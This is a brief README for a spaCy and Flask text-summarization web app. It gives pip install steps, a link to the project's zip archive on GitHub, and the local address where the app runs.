# text_summarization
- First install following libraries using python `pip`.<br>
`pip install -U setuptools wheel`<br>
`pip install -U spacy`<br>
`python -m spacy download en_core_web_sm`<br>
`pip install Flask`<br>

- Run `https://raw.githubusercontent.com/supratim1020/text_summarization/main/static/text_summarization_3.0.zip` file and open `http://127.0.0.1:5000` to your browser.
